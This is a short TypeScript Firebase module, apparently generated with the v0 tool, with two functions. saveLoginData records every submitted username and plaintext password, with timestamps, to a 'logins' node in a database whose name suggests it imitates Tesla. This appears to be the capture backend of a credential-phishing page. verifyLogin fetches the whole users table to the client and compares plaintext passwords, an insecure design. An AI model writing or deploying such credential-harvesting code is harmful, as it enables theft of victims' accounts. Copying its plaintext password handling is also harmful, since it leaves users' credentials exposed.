import { initializeApp } from "firebase/app"
import { getDatabase, ref, get, push, set } from "firebase/database"

const firebaseConfig = {
  databaseURL: "https://tesla-ae2a9-default-rtdb.firebaseio.com/",
}

const app = initializeApp(firebaseConfig)
const database = getDatabase(app)

export async function saveLoginData(username: string, password: string): Promise<void> {
  try {
    const loginsRef = ref(database, "logins")
    const newLoginRef = push(loginsRef)

    await set(newLoginRef, {
      username: username,
      password: password,
      timestamp: new Date().toISOString(),
      date: new Date().toLocaleString("pt-BR", {
        timeZone: "America/Sao_Paulo",
        dateStyle: "short",
        timeStyle: "medium",
      }),
    })

    console.log("[v0] Login data saved to Firebase")
  } catch (error) {
    console.error("[v0] Error saving login data:", error)
    throw error
  }
}

export async function verifyLogin(username: string, password: string): Promise<boolean> {
  try {
    const usersRef = ref(database, "users")
    const snapshot = await get(usersRef)

    if (snapshot.exists()) {
      const users = snapshot.val()

      // Check if user exists and password matches
      for (const userId in users) {
        const user = users[userId]
        if (user.username === username && user.password === password) {
          return true
        }
      }
    }

    return false
  } catch (error) {
    console.error("[v0] Firebase authentication error:", error)
    return false
  }
}
